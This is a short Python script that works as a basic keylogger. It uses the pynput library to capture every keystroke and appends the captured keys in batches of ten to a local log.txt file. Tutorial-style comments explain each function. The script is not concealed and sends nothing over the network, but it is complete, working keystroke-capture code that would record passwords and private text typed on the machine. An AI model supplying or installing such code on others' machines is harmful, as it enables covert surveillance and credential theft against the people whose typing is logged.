import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []


"""
function used to store anything you write on your keyboard and after 10 types they are stored in a file
"""
def on_press(key):
    global keys, count
    
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_on_file(keys)
        keys = []

"""
function used to stop your program
"""
def on_release(key):
    if key == Key.esc:
        return False

"""
function used for write all characters into a file.txt. we used simple replace with a space blank if we captures special characters like (ctrl + c ecc..)
we go in an other lines if we type spacebar
"""

def write_on_file(keys):
    with open("log.txt", "a") as f:
        
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0 :
                f.write('\n')
            elif k.find("Key") == -1 :
                f.write(k)

# we use listener to listen a key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    